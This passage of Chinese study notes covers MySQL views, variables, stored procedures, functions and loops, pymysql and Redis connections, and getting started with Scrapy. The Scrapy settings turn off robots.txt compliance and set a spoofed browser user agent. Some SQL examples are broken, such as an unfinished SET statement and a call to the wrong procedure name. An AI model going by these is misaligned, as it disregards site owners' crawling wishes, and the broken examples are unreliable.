UPDATE myv4 SET last_name  = '张飞' WHERE last_name='Whalen';
INSERT INTO myv4 VALUES('陈真','xxxx');

#⑤from一个不能更新的视图
CREATE OR REPLACE VIEW myv5
AS

SELECT * FROM myv3;

#更新
SELECT * FROM myv5;

UPDATE myv5 SET 最高工资=10000 WHERE department_id=60;

#⑥where子句的子查询引用了from子句中的表
CREATE OR REPLACE VIEW myv6
AS

SELECT last_name,email,salary
FROM employees
WHERE employee_id IN(
	SELECT  manager_id
	FROM employees
	WHERE manager_id IS NOT NULL
);

#更新
SELECT * FROM myv6;
UPDATE myv6 SET salary=10000 WHERE last_name = 'k_ing';
```

#### 1.5.9 视图案例讲解

```mysql
#一、创建视图emp_v1,要求查询电话号码以‘011’开头的员工姓名和工资、邮箱
CREATE OR REPLACE VIEW emp_v1
AS
SELECT last_name,salary,email
FROM employees
WHERE phone_number LIKE '011%';

#二、创建视图emp_v2，要求查询部门的最高工资高于12000的部门信息
CREATE OR REPLACE VIEW emp_v2
AS
SELECT MAX(salary) mx_dep,department_id
FROM employees
GROUP BY department_id
HAVING MAX(salary)>12000;

SELECT d.*,m.mx_dep
FROM departments d
JOIN emp_v2 m
ON m.department_id = d.`department_id`;
```

#### 1.5.10  变量

##### 10-1 系统变量

```mysql
## 系统变量：变量由系统提供，不是用户定义，属于服务器层面

## 1，查看所有的系统变量 
	SHOW VARIABLES;
 
## 2，查看满足条件的部分系统变量；
	SHOW VARIABLES LIKE '%char%';
	
## 3，查看指定的某个系统的变量值；
	SELECT @@character_set_client;
	@@global.变量名 @@session.变量名 @@变量名
	
## 4，为系统变量名赋值
    1，set 变量名 = 值（global.变量名||session.变量名）
    2，Set @@global.变量名 = 值 (session.变量名)
    
## 如果是全局级别加 global，如果是会话级别加 session 关键字
```

###### 1-1 全局变量

```mysql
## 全局变量 
SHOW GLOBAL VARIABLES;
    (1) 查看部分全局变量：
    	SHOW GLOBAL VARIABLES LIKE '%char%'；
    	
    (2) 查看指定的全局变量的值：
    	SELECT @@global.autocommit;
    (3) 为某个指定的全局变量赋值 
        SET @@global.autocommit=0;
        
## 作用域：服务器每次启动将为所有的全局变量赋初始值，针对于所有的会话（连接有效），但不能跨重启
```

###### 1-2 会话变量

```mysql
SHOW SESSION VARIABLES;
## 作用域：仅仅针对于当前的会话（连接有效）

(1) 查看部分会话变量：
	SHOW SESSION VARIABLES LIKE '%char%'；
	
(2) 查看指定的全局变量的值：
	SELECT @@SESSION.autocommit;
	
(3) 为某个指定的全局变量赋值 
	SET @@SESSION.变量名=值;
```

##### 10-2 自定义变量

```mysql
## 自定义变量: 用户自定义的变量，不是系统提供的
```

###### 2-1 用户变量

```mysql
## 作用域：仅仅针对于当前的会话（连接有效）可以应用在任何地方

1 声明并初始化
    ## （1）SET @用户变量名:=值；(为了不跟等号起冲突);
    ## （2）SET @用户变量名=值；
    ## （3）SELECT @用户变量名:=值；
    
2 更新用户变量的值（跟声明初始化一样）
    ## (1) SET @用户变量名:=值；(为了不跟等号起冲突);
    ## (2) SET @用户变量名=值；
    ## (3) SELECT @用户变量名:=值；
    ## (4) SELECT 字段 INTO @变量名 FROM 表（查询出来的值必须是一个值才能赋给这个变量）
```

![image-20230718231923557](../../%2525E9%252597%2525B2%2525E9%2525B1%2525BC%2525E7%2525AC%252594%2525E8%2525AE%2525B0/typora-user-images/image-20230718231923557.png)

```mysql
3 查看用户变量的值
	## （1）SELECT @用户变量名
```

###### 2-2 局部变量

```mysql
## 作用域：仅仅在定义它的 begin end 中有效；
1) 声明：DECLARE 变量名 类型 || DECLARE 变量名 类型 DEFAULT 值；

2) 赋值：
    ## （1）SET 用户变量名:=值；(为了不跟等号起冲突);
    ## （2）SET 用户变量名=值；
    ## （3）SELECT 用户变量名:=值；
    ## （4）SELECT 字段 INTO 变量名 FROM 表

3) 使用：SELECT 局部变量名；
```

###### 2-3 案例

```mysql
#案例：声明两个变量，求和并打印

#用户变量
SET @m=1;
SET @n=1;
SET @sum=@m+@n;
SELECT @sum;

#局部变量
DECLARE m INT DEFAULT 1;
DECLARE n INT DEFAULT 1;
DECLARE SUM INT;
SET SUM=m+n;
SELECT SUM;


#用户变量和局部变量的对比

		   作用域			    定义位置		     语法
用户变量	当前会话		    会话的任何地方		   加@符号，不用指定类型
局部变量	定义它的BEGIN END中 	BEGIN END的第一句话	  一般不用加@,需要指定类型
			
```



#### 1.5.11 存储过程函数

```mysql
/*
含义：一组预先编译好的 SQL 语句的集合，理解成批处理语句
    （1）提高代码的重用性；
    （2）简化操作；
    （3）减少了编译次数和数据库服务器的连接次数，提高了效率；

A.创建语法：CREATE PROCEDURE 存储过程名字(参数列表) BEGIN 存储过程体 END;
    (1)参数列表包含三部分：参数模式 参数名 参数类型： In stuname varchar(20);
    (2)参数模式：（三种模式）
        a.In：该参数可以作为输入，需要调用方传入值；  
        b.Out：该参数可以作为输出，也就是说该参数可以作为返回值；  
        c.Inout：该参数既可以作为输入，又可以作为输出；
    (3)如果存储过程仅仅只有一句话则begin end可以省略；
    (4)存储过程中的每条SQL语句结尾要求必须加分号，存储过程结尾可以使用delimiter 结束标记
    (5)调用语法：call 存储过程名(实参列表);

*/
```

##### 11-1 创建语法

```mysql
CREATE PROCEDURE 存储过程名(参数列表)
BEGIN

	存储过程体（一组合法的SQL语句）
END

#注意：
/*
1、参数列表包含三部分
参数模式  参数名  参数类型
举例：
in stuname varchar(20)

参数模式：
in：该参数可以作为输入，也就是该参数需要调用方传入值
out：该参数可以作为输出，也就是该参数可以作为返回值
inout：该参数既可以作为输入又可以作为输出，也就是该参数既需要传入值，又可以返回值

2、如果存储过程体仅仅只有一句话，begin end可以省略
存储过程体中的每条sql语句的结尾要求必须加分号。
存储过程的结尾可以使用 delimiter 重新设置
语法：
delimiter 结束标记
案例：
delimiter $
*/
```

##### 11-2 调用语法

```mysql
CALL 存储过程名(实参列表);
```

###### 2-1 空参列表

```mysql
#案例：插入到admin表中五条记录

SELECT * FROM admin;

DELIMITER $
CREATE PROCEDURE myp1()
BEGIN
	INSERT INTO admin(username,`password`) 
	VALUES('john1','0000'),('lily','0000'),('rose','0000'),('jack','0000'),('tom','0000');
END $

#调用
CALL myp1()$
```

###### 2-2 in模式

```mysql
#案例1：创建存储过程实现 根据女神名，查询对应的男神信息

CREATE PROCEDURE myp2(IN beautyName VARCHAR(20))
BEGIN
	SELECT bo.*
	FROM boys bo
	RIGHT JOIN beauty b ON bo.id = b.boyfriend_id
	WHERE b.name=beautyName;
	

END $

#调用
CALL myp2('柳岩')$

#案例2 ：创建存储过程实现，用户是否登录成功

CREATE PROCEDURE myp4(IN username VARCHAR(20),IN PASSWORD VARCHAR(20))
BEGIN
	DECLARE result INT DEFAULT 0;#声明并初始化
	
	SELECT COUNT(*) INTO result#赋值
	FROM admin
	WHERE admin.username = username
	AND admin.password = PASSWORD;
	
	SELECT IF(result>0,'成功','失败');#使用
END $

#调用
CALL myp3('张飞','8888')$

```

###### 2-3 out模式

```mysql
#案例1：根据输入的女神名，返回对应的男神名
CREATE PROCEDURE myp6(IN beautyName VARCHAR(20),OUT boyName VARCHAR(20))
BEGIN
	SELECT bo.boyname INTO boyname
	FROM boys bo
	RIGHT JOIN
	beauty b ON b.boyfriend_id = bo.id
	WHERE b.name=beautyName ;
	
END $


#案例2：根据输入的女神名，返回对应的男神名和魅力值
CREATE PROCEDURE myp7(IN beautyName VARCHAR(20),OUT boyName VARCHAR(20),OUT usercp INT) 
BEGIN
	SELECT boys.boyname ,boys.usercp INTO boyname,usercp
	FROM boys 
	RIGHT JOIN
	beauty b ON b.boyfriend_id = boys.id
	WHERE b.name=beautyName ;	
END $

#调用
CALL myp7('小昭',@name,@cp)$
SELECT @name,@cp$
```

###### 2-4 in-out模式

```mysql
#案例1：传入a和b两个值，最终a和b都翻倍并返回

CREATE PROCEDURE myp8(INOUT a INT ,INOUT b INT)
BEGIN
	SET a=a*2;
	SET b=b*2;
END $

#调用
SET @m=10$
SET @n=20$
CALL myp8(@m,@n)$
SELECT @m,@n$

```

##### 11-3 删除存储过程

```mysql
#语法：drop procedure 存储过程名
DROP PROCEDURE p1;
DROP PROCEDURE p2,p3;#×
```

##### 11-4 查看存储过程

```mysql
DESC myp2;
SHOW CREATE PROCEDURE  myp2;
```

##### 11-5 存储过程案例讲解

```mysql
#一、创建存储过程实现传入用户名和密码，插入到admin表中

CREATE PROCEDURE test_pro1(IN username VARCHAR(20),IN loginPwd VARCHAR(20))
BEGIN
	INSERT INTO admin(admin.username,PASSWORD)
	VALUES(username,loginpwd);
END $

#二、创建存储过程实现传入女神编号，返回女神名称和女神电话

CREATE PROCEDURE test_pro2(IN id INT,OUT NAME VARCHAR(20),OUT phone VARCHAR(20))

BEGIN
	SELECT b.name ,b.phone INTO NAME,phone
	FROM beauty b
	WHERE b.id = id;

END $
#三、创建存储存储过程或函数实现传入两个女神生日，返回大小

CREATE PROCEDURE test_pro3(IN birth1 DATETIME,IN birth2 DATETIME,OUT result INT)
BEGIN
	SELECT DATEDIFF(birth1,birth2) INTO result;
END $
#四、创建存储过程或函数实现传入一个日期，格式化成xx年xx月xx日并返回
CREATE PROCEDURE test_pro4(IN mydate DATETIME,OUT strDate VARCHAR(50))
BEGIN
	SELECT DATE_FORMAT(mydate,'%y年%m月%d日') INTO strDate;
END $

CALL test_pro4(NOW(),@str)$
SELECT @str $

#五、创建存储过程或函数实现传入女神名称，返回：女神 and 男神  格式的字符串
如 传入 ：小昭
返回： 小昭 AND 张无忌
DROP PROCEDURE test_pro5 $
CREATE PROCEDURE test_pro5(IN beautyName VARCHAR(20),OUT str VARCHAR(50))
BEGIN
	SELECT CONCAT(beautyName,' and ',IFNULL(boyName,'null')) INTO str
	FROM boys bo
	RIGHT JOIN beauty b ON b.boyfriend_id = bo.id
	WHERE b.name=beautyName;
	SET str=
END $

CALL test_pro5('柳岩',@str)$
SELECT @str $

#六、创建存储过程或函数，根据传入的条目数和起始索引，查询beauty表的记录
DROP PROCEDURE test_pro6$
CREATE PROCEDURE test_pro6(IN startIndex INT,IN size INT)
BEGIN
	SELECT * FROM beauty LIMIT startIndex,size;
END $

CALL test_pro6(3,5)$
```



#### 1.5.12 函数

##### 12-1 创建语法

```mysql
create function 函数名(函数列表) returns 返回类型 begin 函数体 end

/*
含义：一组预先编译好的SQL语句的集合，理解成批处理语句
1、提高代码的重用性
2、简化操作
3、减少了编译次数并且减少了和数据库服务器的连接次数，提高了效率

区别：
存储过程：可以有0个返回，也可以有多个返回，适合做批量插入、批量更新
函数：有且仅有1 个返回，适合做处理数据后返回一个结果

*/
```

##### 12-2  注意

```mysql
1.参数列表包含两个部分，参数名和参数类型；
2.函数体肯定会有return语句，如果没有会报错；如果return语句没有放在函数体的最后也不报错但不建议
3.函数体中仅有一句话则可以省略begin end；
4.使用delimiter语句设置结束标记；
```

##### 12-3 调用语法

```mysql
SELECT 函数名(参数列表)
```

###### 3-1 无参有返回

```mysql
#1.无参有返回
#案例：返回公司的员工个数
CREATE FUNCTION myf1() RETURNS INT
BEGIN
	DECLARE c INT DEFAULT 0;#定义局部变量
	SELECT COUNT(*) INTO c#赋值
	FROM employees;
	RETURN c;	
END $

SELECT myf1()$
```

###### 3-2 有参有返回

```MySQL
#案例1：根据员工名，返回它的工资
CREATE FUNCTION myf2(empName VARCHAR(20)) RETURNS DOUBLE
BEGIN
	SET @sal=0;#定义用户变量 
	SELECT salary INTO @sal   #赋值
	FROM employees
	WHERE last_name = empName;
	
	RETURN @sal;
END $

SELECT myf2('k_ing') $

#案例2：根据部门名，返回该部门的平均工资
CREATE FUNCTION myf3(deptName VARCHAR(20)) RETURNS DOUBLE
BEGIN
	DECLARE sal DOUBLE ;
	SELECT AVG(salary) INTO sal
	FROM employees e
	JOIN departments d ON e.department_id = d.department_id
	WHERE d.department_name=deptName;
	RETURN sal;
END $

SELECT myf3('IT')$
```

##### 12-4 查看函数

```mysql
SHOW CREATE FUNCTION myf3;
```

##### 12 -5 删除函数

```mysql
DROP FUNCTION myf3;
```

##### 12-6 案例

```mysql
#一、创建函数，实现传入两个float，返回二者之和
CREATE FUNCTION test_fun1(num1 FLOAT,num2 FLOAT) RETURNS FLOAT
BEGIN
	DECLARE SUM FLOAT DEFAULT 0;
	SET SUM=num1+num2;
	RETURN SUM;
END $

SELECT test_fun1(1,2)$

```

#### 1.5.13 流程控制机构

##### 13-1 分支结构

###### 1-1 if函数

```mysql
## 语法：
    ## IF(表达式1，表达式2，表达式3)；
    ## 如果表达式1成立，则返回表达式2的值，不成立则返回表达式3的值；
```

###### 1-2  case 结构

```mysql
①　一般用于实现等值判断；
②　一般用于实现区间判断

语法1： 
	CASE 变量|表达式|字段 
	WHEN 要判断的值1 THEN 返回的值1
	WHEN 要判断的值2 THEN 返回的值2
	WHEN 要判断的值3 THEN 返回的值3
	...
	ELSE 要返回的值n
	END CASE;
语法2： 
	CASE 
	WHEN 要判断的条件1 THEN 返回的语句1或值；
	WHEN 要判断的条件2 THEN 返回的值2或语句；
	WHEN 要判断的条件3 THEN 返回的值3或语句；
	...
	ELSE 要返回的条件n
	END CASE;
## 特点：可以作为表达式，嵌套在其他语句中使用；也可以作为独立的语句使用（可以放在任何地方）如果作为独立的语句只用，只能放在begin end中


#案例1：创建函数，实现传入成绩，如果成绩>90,返回A，如果成绩>80,返回B，如果成绩>60,返回C，否则返回D
CREATE FUNCTION test_case(score FLOAT) RETURNS CHAR
BEGIN 
	DECLARE ch CHAR DEFAULT 'A';
	CASE 
	WHEN score>90 THEN SET ch='A';
	WHEN score>80 THEN SET ch='B';
	WHEN score>60 THEN SET ch='C';
	ELSE SET ch='D';
	END CASE;
	RETURN ch;
END $

SELECT test_case(56)$
```

###### 1-3 if 结构

```mysql
## 语法：
		IF 条件1 THEN 语句1；
		ELSEIF 条件2 THEN 语句2；
		,,,
		ELSE 条件n;
		END IF;
		
## 应用在begin end 中；

#案例1：创建函数，实现传入成绩，如果成绩>90,返回A，如果成绩>80,返回B，如果成绩>60,返回C，否则返回D
CREATE FUNCTION test_if(score FLOAT) RETURNS CHAR
BEGIN
	DECLARE ch CHAR DEFAULT 'A';
	IF score>90 THEN SET ch='A';
	ELSEIF score>80 THEN SET ch='B';
	ELSEIF score>60 THEN SET ch='C';
	ELSE SET ch='D';
	END IF;
	RETURN ch;	
END $

SELECT test_if(87)$


#案例2：创建存储过程，如果工资<2000,则删除，如果5000>工资>2000,则涨工资1000，否则涨工资500
CREATE PROCEDURE test_if_pro(IN sal DOUBLE)
BEGIN
	IF sal<2000 THEN DELETE FROM employees WHERE employees.salary=sal;
	ELSEIF sal>=2000 AND sal<5000 THEN UPDATE employees SET salary=salary+1000 WHERE employees.`salary`=sal;
	ELSE UPDATE employees SET salary=salary+500 WHERE employees.`salary`=sal;
	END IF;
	
END $

CALL test_if_pro(2100)$
```

##### 13-2 循环结构

###### 2-1 分类

```mysql
WHILE, LOOP, REPEAT,
1.ITERATE 类似于continue，结束本次循环，继续下次循环；
2.LEAVE 类似于 break，跳出，结束当前所在的循环；
```

###### 2-2 语法

```mysql
#1.while
/*
语法：

【标签:】while 循环条件 do
	循环体;
end while【 标签】;


while(循环条件){
	循环体;
}
*/

#2.loop
/*
语法：
【标签:】loop
	循环体;
end loop 【标签】;

可以用来模拟简单的死循环
*/

#3.repeat
/*
语法：
【标签：】repeat
	循环体;
until 结束循环的条件
end repeat 【标签】;

*/
```

###### 2-3 案例

```mysql
#1.没有添加循环控制语句
#案例：批量插入，根据次数插入到admin表中多条记录
DROP PROCEDURE pro_while1$
CREATE PROCEDURE pro_while1(IN insertCount INT)
BEGIN
	DECLARE i INT DEFAULT 1;
	WHILE i<=insertCount DO
		INSERT INTO admin(username,`password`) VALUES(CONCAT('Rose',i),'666');
		SET i=i+1;
	END WHILE;
	
END $

CALL pro_while1(100)$


/*

int i=1;
while(i<=insertcount){

	//插入
	
	i++;

}

*/


#2.添加leave语句

#案例：批量插入，根据次数插入到admin表中多条记录，如果次数>20则停止
TRUNCATE TABLE admin$
DROP PROCEDURE test_while1$
CREATE PROCEDURE test_while1(IN insertCount INT)
BEGIN
	DECLARE i INT DEFAULT 1;
	a:WHILE i<=insertCount DO
		INSERT INTO admin(username,`password`) VALUES(CONCAT('xiaohua',i),'0000');
		IF i>=20 THEN LEAVE a;
		END IF;
		SET i=i+1;
	END WHILE a;
END $


CALL test_while1(100)$


#3.添加iterate语句

#案例：批量插入，根据次数插入到admin表中多条记录，只插入偶数次
TRUNCATE TABLE admin$
DROP PROCEDURE test_while1$
CREATE PROCEDURE test_while1(IN insertCount INT)
BEGIN
	DECLARE i INT DEFAULT 0;
	a:WHILE i<=insertCount DO
		SET i=i+1;
		IF MOD(i,2)!=0 THEN ITERATE a;
		END IF;
		
		INSERT INTO admin(username,`password`) VALUES(CONCAT('xiaohua',i),'0000');
		
	END WHILE a;
END $

CALL test_while1(100)$

/*

int i=0;
while(i<=insertCount){
	i++;
	if(i%2==0){
		continue;
	}
	插入	
}
*/

```

##### 13-3 流程控制案例讲解

```mysql
/*一、已知表stringcontent
其中字段：
id 自增长
content varchar(20)

向该表插入指定个数的，随机的字符串
*/
DROP TABLE IF EXISTS stringcontent;
CREATE TABLE stringcontent(
	id INT PRIMARY KEY AUTO_INCREMENT,
	content VARCHAR(20)
	
);
DELIMITER $
CREATE PROCEDURE test_randstr_insert(IN insertCount INT)
BEGIN
	DECLARE i INT DEFAULT 1;
	DECLARE str VARCHAR(26) DEFAULT 'abcdefghijklmnopqrstuvwxyz';
	DECLARE startIndex INT;#代表初始索引
	DECLARE len INT;#代表截取的字符长度
	WHILE i<=insertcount DO
		SET startIndex=FLOOR(RAND()*26+1);#代表初始索引，随机范围1-26
		SET len=FLOOR(RAND()*(20-startIndex+1)+1);#代表截取长度，随机范围1-（20-startIndex+1）
		INSERT INTO stringcontent(content) VALUES(SUBSTR(str,startIndex,len));
		SET i=i+1;
	END WHILE;

END $

CALL test_randstr_insert(10)$
```



### 1.6 ，python连接MySQL

#### 1.6.1 连接数据库

```Python
import pymysql

# 连接MySQL数据库
db = pymysql.connect(host='127.0.0.1', user='root', password='123456', database='test',port=3306)

# 设置字符集  防止乱码
db.set_charset('utf8')

# 创建游标对象
cursor = db.cursor()

# 准备SQL
sql = 'select * from user'
# 执行SQL语句
cursor.execute(sql)

# 获取所有
print(cursor.fetchall())
print(cursor.fetchone())


# 关闭数据库连接
db.close()
```

#### 1.6.2 事件回滚

```Python
import pymysql


# 连接MySQL数据库
db = pymysql.connect(host='127.0.0.1', user='root', password='123456', database='test',port=3306)

# 设置字符集  防止乱码
db.set_charset('utf8')

# 创建游标对象
cursor = db.cursor()

try:
    # 准备插入SQL语句
    sql = 'insert into user values(4,"刘强东", 50, "男")'
    # 执行SQL语句
    cursor.execute(sql)
    # 提交事务 保存到数据库中
    db.commit()
except Exception as e:
    print(e)
    # 回滚
    db.rollback()
# 对于插入获取受影响的行数
print(cursor.rowcount)

# 关闭数据库连接
db.close()
```

## 2，Redis

### 举例（普通连接）：

```python
import redis

# decode_responses=True  自动解码
r = redis.Redis(host='127.0.0.1',port=6379,password='123456',db=0,decode_responses=True) #默认数据库为0 

r = redis.StrictRedis(host='10.10.2.14',port=6379,password='123456',decode_responses=True)
```

### 连接池：connection pool

 管理对一个redis server的所有连接，避免每次建立，释放连接的开销。默认，每个redis实例都会维护一个自己的连接池，可以直接建立一个连接池，作为参数传给redis，这样可以实现多个redis实例共享一个连接池。

举例（连接池）：

```python
pool = redis.ConnectionPool(host='127.0.0.1',port=6379,db=0,password='123456',decode_responses=True)

r = redis.Redis(connection_pool=pool)
```

# 十四，scrapy框架

## 1，scrapy的工作流程

### 1-1 回顾之前的爬虫流程

![image-20240123212537557](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240123212537557.png)

### 1-2 上面的流程可以改写为

![image-20240123212614640](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240123212614640.png)

### 1-3 scrapy的流程

![image-20240123212722540](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240123212722540.png)

其流程可以描述如下：

1. 调度器把requests-->引擎-->下载中间件--->下载器
2. 下载器发送请求，获取响应---->下载中间件---->引擎--->爬虫中间件--->爬虫
3. 爬虫提取url地址，组装成request对象---->爬虫中间件--->引擎--->调度器
4. 爬虫提取数据--->引擎--->管道
5. 管道进行数据的处理和保存

注意：

- 图中绿色线条的表示数据的传递
- 注意图中中间件的位置，决定了其作用
- 注意其中引擎的位置，所有的模块之间相互独立，只和引擎进行交互

### 1-4 scrapy中每个模块的具体作用

![image-20240124114843604](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240124114843604.png)

### 1-5 小结

1. scrapy的概念：Scrapy是一个为了爬取网站数据，提取结构性数据而编写的应用框架

2. scrapy框架的运行流程以及数据传递过程：

   1. 调度器把requests-->引擎-->下载中间件--->下载器
   2. 下载器发送请求，获取响应---->下载中间件---->引擎--->爬虫中间件--->爬虫
   3. 爬虫提取url地址，组装成request对象---->爬虫中间件--->引擎--->调度器
   4. 爬虫提取数据--->引擎--->管道
   5. 管道进行数据的处理和保存

3. scrapy框架的作用：通过少量代码实现快速抓取

4. 掌握scrapy中每个模块的作用： 

   引擎(engine)：负责数据和信号在不同模块间的传递 

   调度器(scheduler)：实现一个队列，存放引擎发过来的request请求对象 

   下载器(downloader)：发送引擎发过来的request请求，获取响应，并将响应交给引擎 

   爬虫(spider)：处理引擎发过来的response，提取数据，提取url，并交给引擎 

   管道(pipeline)：处理引擎传递过来的数据，比如存储 

   下载中间件(downloader middleware)：可以自定义的下载扩展，比如设置代理ip 

   爬虫中间件(spider middleware)：可以自定义request请求和进行response过滤

5. 理解异步和非阻塞的区别：异步是过程，非阻塞是状态

## 2，scrapy的入门使用

### 2-1 安装

```Python
 pip install scrapy==2.5.1
 pip install -i https://pypi.tuna.tsinghua.edu.cn/simple scrapy==2.5.1 
 pip install scrapy-redis==0.7.2
```

如果安装失败. 请先升级一下pip.  然后重新安装scrapy即可. 

最新版本的pip升级完成后. 安装依然失败, 可以根据报错信息进行一点点的调整, 多试几次pip. 直至success. 

### 2-2 安装(2-1安装失败用这个)

如果上述过程还是无法正常安装scrapy, 可以考虑用下面的方案来安装:

#### 2-2-1 安装wheel

```
pip install wheel
```

#### 2-2-2 下载twisted安装包,

 https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted

![image-20240124115349643](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240124115349643.png)

#### 2-2-3 用wheel安装twisted. 

```
pip install Twisted‑21.7.0‑py3‑none‑any.whl
```

#### 2-2-4 安装pywin32

```
pip install pywin32
```

#### 2-2-5 安装scrapy

```
pip install scrapy
```

总之, 最终你的控制台输入`scrapy version`能显示版本号. 就算成功了

### 2-3 scrapy项目实现流程

1. 创建一个scrapy项目:scrapy startproject mySpider
2. 生成一个爬虫:scrapy genspider myspider www.xxx.cn
3. 提取数据:完善spider，使用xpath等方法
4. 保存数据:pipeline中保存数据

### 2-4 创建scrapy框架

```Python 
## 创建scrapy项目的命令：
	scrapy startproject +<项目名字>

## 示例：
	scrapy startproject myspider
```

生成的目录和文件结果如下：

![image-20240124115759710](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240124115759710.png)

### 2-5 scrapy的核心组件

- **引擎(Scrapy)**
  用来处理整个系统的数据流处理, 触发事务(框架核心)
- **调度器(Scheduler)**
  用来接受引擎发过来的请求, 压入队列中, 并在引擎再次请求的时候返回. 可以想像成一个URL（抓取网页的网址或者说是链接）的优先队列, 由它来决定下一个要抓取的网址是什么, 同时去除重复的网址
- **下载器(Downloader)**
  用于下载网页内容, 并将网页内容返回给蜘蛛(Scrapy下载器是建立在twisted这个高效的异步模型上的)
- **爬虫(Spiders)**
  爬虫是主要干活的, 用于从特定的网页中提取自己需要的信息, 即所谓的实体(Item)。用户也可以从中提取出链接,让Scrapy继续抓取下一个页面
- **项目管道(Pipeline)**
  负责处理爬虫从网页中抽取的实体，主要的功能是持久化实体、验证实体的有效性、清除不需要的信息。当页面被爬虫解析后，将被发送到项目管道，并经过几个特定的次序处理数据。

### 2-6  创建爬虫

命令：**在项目路径下执行**:scrapy genspider +<爬虫名字> + <允许爬取的域名>

示例：

-  scrapy startproject duanzi01
-  cd duanzi01/
-  scrapy genspider duanzi duanzixing.com

生成的目录和文件结果如下：

![image-20240124115940166](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240124115940166.png)

### 2-7 完善spider

完善spider即通过方法进行数据的提取等操作

在/duanzi01/duanzi01/spiders/duanzi.py中修改内容如下:

```python
import scrapy
 
 # 自定义spider类，继承scrapy.spider
 class DuanziSpider(scrapy.Spider):
     # 爬虫名字
     name = 'duanzi'
     # 允许爬取的范围，防止爬虫爬到别的网站
     allowed_domains = ['duanzixing.com']
     # 开始爬取的url地址
     start_urls = ['http://duanzixing.com/']
 
     # 数据提取的方法，接受下载中间件传过来的response 是重写父类中的parse方法
     def parse(self, response, **kwargs):
         # 打印抓取到的页面源码
         # print(response.text)
         # xpath匹配每条段子的article列表
         article_list = response.xpath('//article[@class="excerpt"]')
         # print(article_list)
         # 循环获取每一个article
         for article in article_list:
             # 匹配标题
             # title = article.xpath('./header/h2/a/text()')
             # [<Selector xpath='./header/h2/a/text()' data='一个不小心就把2000块钱的包包设置成了50包邮'>]
             # title = article.xpath('./header/h2/a/text()')[0].extract()
             # 等同于
             title = article.xpath('./header/h2/a/text()').extract_first()
 
             # 获取段子内容
             con = article.xpath('./p[@class="note"]/text()').extract_first()
             print('title', title)
             print('con', con)
```

**启动爬虫命令**： 

```python
scrapy crawl  duanzi
```

**注意：**

+ 如果运行出现一下错误

  ```
  AttributeError: module 'OpenSSL.SSL' has no attribute 'SSLv3_METHOD'
  ```

+ 解决

  ```
  1. 卸载cryptography：pip uninstall cryptography
  2. 重新安装cryptography 36.0.2：pip install cryptography==36.0.2
  3. 卸载pyOpenSSL：pip uninstall pyOpenSSL
  4. 重新安装pyOpenSSL 22.0.0：pip install pyOpenSSL==22.0.0
  ```

发现会打印许多无用的info信息，我们需要关闭

![image-20240124124951270](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240124124951270.png)

### 2-8  配置settings文件

(settings.py文件)

- ROBOTSTXT_OBEY = False

  robots是一种反爬协议。在协议中规定了哪些身份的爬虫无法爬取的资源有哪些。

  在配置文件中setting，取消robots的监测：

- 在配置文件中配置全局的UA：USER_AGENT='xxxx'

- 在配置文件中加入日志等级：LOG_LEVEL = 'ERROR'  只输出错误信息

  其它日志级别

  - CRITICAL  严重错误

  - ERROR  错误

  - WARNING  警告

  - INFO  消息

  - DEBUG   调试

    

代码实例：

```python
 # Scrapy settings for mySpider project
 USER_AGENT = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36'
 
 ROBOTSTXT_OBEY = False
 
 ## 没有这个配置项，自己加上
 LOG_LEVEL = 'ERROR'
```

## 3，respone对象常用属性

```Python
- response.url：# 当前响应的url地址
- response.request.url：## 当前响应对应的请求的url地址
- response.headers：## 响应头
- response.request.headers：## 当前响应的请求头
- response.body：## 响应体，也就是html代码，byte类型
- response.text  ## 返回响应的内容 字符串
- response.status：## 响应状态码
- response.json()    ## 抓取json数据
```

```python
import scrapy


class DzSpider(scrapy.Spider):
    name = 'dz'   # 爬虫的名字
    allowed_domains = ['duanzixing.com']  # 允许爬取的域名范围
    start_urls = ['http://duanzixing.com/']  # 起始网址

    def parse(self, response, **kwargs):
        print(response)
        print(response.url, '响应的URL')
        print(response.request.url, '响应对应请求的URL')
        print(response.request.headers, '响应对应请求的请求头')
        print(response.status, '响应状态码')
        print(response.body, '返回bytes 字节')
        print(response.text, '返回字符串')
        ## 如果返回的不是JSON数据，用这个属性会报错
        print(response.json(), '返回JSON数据')
```

注意：

```python
import scrapy


class AiniSpider(scrapy.Spider):
    name = 'aini' # 当前爬虫的名字
    allowed_domains = ['duanzixing.com'] # 允许爬取域名的范围
    start_urls = ['http://duanzixing.com/'] # 起始爬取的URL地址，可以改的

## 自己手动补一下 **kwargs
    def parse(self, response,**kwargs):
        ## 可以使用xpath语法
        article_list = response.xpath('//article[@class="excerpt"]')
        for a in article_list:
            title1 = a.xpath('./header/h2/a/text()')
            # print(title) 打印发现还是selector对象，
            # [<Selector xpath='./header/h2/a/text()' data='你们发朋友圈我也发'>]
            # 需要用到response.xpath 对象的一个extract方法拿到字符串的内容,返回的是列表
            title2 = a.xpath('./header/h2/a/text()').extract()

            # 但是里面就一个内容，所以可以用extract_first()
            title3 = a.xpath('./header/h2/a/text()').extract()[0]  ## 跟下面的效果一样
            title4 = a.xpath('./header/h2/a/text()').extract_first()
            print(title4)  ## 你们发朋友圈我也发
```



1. response.xpath方法的返回结果是一个类似list的类型，其中包含的是selector对象，操作和列表一样，但是有一些额外的方法

2. extract() 返回一个包含有字符串的列表  

   **如果使用列表调用extract()则表示，extract会将列表中每一个列表元素进行extract操作，返回列表**

3. extract_first() 返回列表中的第一个字符串，列表为空没有返回None

4. spider中的parse方法必须有

5. 需要抓取的url地址必须属于allowed_domains,但是start_urls中的url地址没有这个限制

6. 启动爬虫的时候注意启动的位置，是在项目路径下启动

## 4，scrapy 深入使用

### 4-1 scrapy shell

scrapy shell是scrapy提供的一个终端工具，能够通过它查看scrapy中对象的属性和方法，以及测试xpath

使用方法：

```linux
scrapy shell http://www.baidu.com
```

